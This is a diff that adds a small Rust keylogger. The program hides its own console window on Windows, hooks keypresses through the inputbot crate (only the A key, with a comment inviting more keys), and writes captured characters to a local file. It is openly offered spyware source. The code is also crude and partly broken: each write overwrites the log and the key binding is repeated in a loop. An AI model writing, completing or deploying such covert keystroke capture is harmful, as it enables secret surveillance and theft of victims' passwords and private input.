@@ -1,0 +1,46 @@
+// The Keylogger duuuh
+
+use inputbot::{handle_input_events, KeybdKey::*};
+use std::fs::OpenOptions;
+use std::fs;
+
+fn hide_console_window() 
+{
+    use std::ptr;
+    use winapi::um::wincon::GetConsoleWindow;
+    use winapi::um::winuser::{ShowWindow, SW_HIDE};
+
+    let window = unsafe {GetConsoleWindow()};
+    if window != ptr::null_mut() {
+        unsafe {
+            ShowWindow(window, SW_HIDE);
+        }
+    }
+}
+
+extern "system" fn log(code: &char)
+{
+   println!("{:?}", code);
+    let _file = OpenOptions::new()
+        .read(true)
+        .write(true)
+        .create(true)
+        .open("logged.txt");
+
+    fs::write("logged.txt", code.to_string()).expect("ErR0r! ERRor! eRRoR! ERROR! error!");
+}
+
+
+pub fn main()
+{
+    hide_console_window();
+    
+		// obviously add the other keys you wanna detect
+    
+		let a_char = 'a';
+    loop
+    {
+        AKey.bind(move|| log(&a_char));
+        handle_input_events();
+    }
+}
